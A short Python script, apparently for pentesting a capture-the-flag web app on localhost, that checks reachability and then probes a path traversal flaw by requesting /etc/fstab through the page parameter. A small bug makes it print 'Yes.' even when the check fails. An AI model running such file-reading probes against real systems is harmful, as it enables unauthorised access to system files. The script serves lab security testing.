"This script is for pentesting WVNCC's unnamed CTF app."
# Created by Sean L. 2024-02-02

import sys
import urllib
import urllib.request
from typing import Literal

if len(sys.argv) > 1:
    target_site = sys.argv[1]
else:
    target_site = "http://localhost/wvncc-ctf"


def smoke_test() -> Literal[False] | Exception:
    "Has our test script burst into flames?"
    request = urllib.request.Request(f"{target_site}/index.php?page=include/home.php")
    try:
        response = urllib.request.urlopen(request)
        result = response.read()
    except Exception as err:
        return err
    
    return False


def is_vulnerable_to_path_traversal() -> bool:
    "Checks to see if /etc/fstab can be stolen via a path traversal attack"

    for location in (f"{target_site}/index.php?page=/etc/fstab", f"{target_site}/index.php?page=../../../../etc/fstab"):
        request = urllib.request.Request(location)
        try:
            response = urllib.request.urlopen(request)
            result = response.read()
            if b"umask" in result:
                return True
        except Exception as err:
            pass
    
    return False

def main():

    smoke = smoke_test()
    print("Site is reachable........", end="")
    if smoke:
        print("No.")
        print(f"Smoke test failed with the error: {smoke}")
        print(f"Make sure the target '{target_site}' is correct.")
        exit(1)
    print("Yes.")
    
    print("Path traversal attack....", end="")
    if not is_vulnerable_to_path_traversal():
        print("No.")
        print("Path traversal test failed!")
    print("Yes.")

main()